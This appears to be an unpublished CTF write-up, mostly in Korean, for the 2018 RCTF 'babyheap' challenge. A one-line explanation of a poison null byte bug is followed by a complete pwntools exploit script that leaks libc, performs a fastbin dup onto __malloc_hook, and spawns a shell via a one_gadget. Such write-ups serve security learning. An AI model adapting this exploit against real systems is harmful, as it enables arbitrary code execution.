---
title: "2018 RCTF babyheap"
date: 2020-3-1
ctf: RCTF
layout: post
published : false
---

Poison null byte 취약점이 발생한다. 두 청크를 한 청크를 가르키게 하고 하나는 free해주고 show해주면 leak이 가능하고 fastbin dup해주면 된다. 

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./babyheap')
libc = e.libc
p = process('./babyheap')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def alloc(size,content):
	sa(':','1')
	sa(':',str(size))
	sa(':',content)

def show(idx):
	sa(':','2')
	sa(':',str(idx))

def delete(idx):
	sa(':','3')
	sa(':',str(idx))

alloc(0x80,'A'*0x80) # 0
alloc(0x100,'B'*(0x100-0x10)+p64(0x100)+'B'*8) # 1
alloc(0x80,'C'*0x80) # 2

delete(0)
delete(1)

alloc(0x88,'A'*0x88) # idx (1) size -> 1byte '\x00' # 0
alloc(0x80,'D'*0x80) # 1
alloc(0x60,'E'*0x60) # 3

delete(1)
delete(2)

alloc(0x80,'F'*0x80)
alloc(0x80,'G'*0x80)
alloc(0x80,'H'*0x80)

# delete(3)
# show(2)

delete(2)
show(3)

libc_base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - 0x3c4b20 - 88
log.info('libc_base : {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc_hook)))

alloc(0x60,'0'*0x60) # 2 , 3
alloc(0x60,'1'*0x60) # 5

delete(2)
delete(5)
delete(3)

alloc(0x60,p64(malloc_hook-35)+'9'*(0x60-8))
alloc(0x60,'4'*0x60)
alloc(0x60,'5'*0x60)
alloc(0x60,'A'*19+p64(libc_base + 0xf02a4)+p64(0)+'A'*61)

delete(6)
delete(6)

p.interactive()
```

<br />

## Reference

https://www.lazenca.net/display/TEC/Poison+null+byte